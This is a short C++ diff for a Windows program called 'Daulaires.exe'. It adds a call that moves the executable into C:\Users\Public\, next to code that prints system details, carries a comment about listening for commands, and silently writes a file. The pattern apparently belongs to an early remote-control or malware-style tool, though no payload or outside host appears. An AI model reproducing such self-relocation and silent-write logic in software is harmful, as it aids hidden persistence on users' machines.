@@ -12,7 +12,8 @@ auto Main::Windows() -> bool
     utils.DisplayText(info.getCurrentDirectory());
     utils.DisplayText(info.getSystemArchitecture());
     utils.DisplayText(info.getSystemType());
-
+    
+    utils.MoveExe("Daulaires.exe", info.getCurrentDirectory(), "C:\\Users\\Public\\");
     // Horrible way of listening for commands
     utils.MoveExe("Daulaires.exe", info.getCurrentDirectory(), "C:\\Users\\Public\\");
     Memory.SilentWriteToFile("test.txt", "C:\\Users\\Public\\", "Hello, world!");
